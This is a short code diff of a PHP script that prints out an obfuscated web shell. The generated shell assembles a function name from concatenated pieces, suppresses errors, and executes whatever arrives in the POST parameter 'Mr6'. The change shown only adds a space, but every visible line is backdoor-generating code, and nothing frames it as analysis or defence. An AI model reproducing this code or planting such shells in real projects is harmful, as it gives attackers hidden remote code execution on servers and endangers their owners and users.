@@ -37,7 +37,7 @@ error_reporting(0);
 	$aa='$db=$_0.$_1.$_2.$_3.$_4.$_5;';
 	echo $aa;
 	echo "\n";
-	echo 'return @$db($this->c);}}';
+	echo 'return @$db($this->c); }}';
 	echo "\n";
 	echo "\${$lname}=new {$bname}();\n";
 	echo "@\${$lname}->c=\$_POST['Mr6'];\n";
